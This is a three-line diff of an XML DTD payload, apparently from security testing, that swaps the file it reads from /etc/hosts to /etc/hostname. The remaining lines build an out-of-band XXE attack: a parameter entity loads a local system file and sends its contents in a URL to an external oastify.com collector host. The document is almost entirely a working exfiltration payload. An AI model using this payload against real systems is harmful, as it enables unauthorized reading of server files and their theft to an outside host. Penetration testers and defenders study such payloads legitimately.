@@ -1,3 +1,3 @@
-<!ENTITY % file SYSTEM "file:///etc/hosts">
+<!ENTITY % file SYSTEM "file:///etc/hostname">
 <!ENTITY % all "<!ENTITY send SYSTEM 'http://2ehn1e47e6i68qum96z4k7uds4yvmvak.oastify.com/?%file;'>">
 %all;
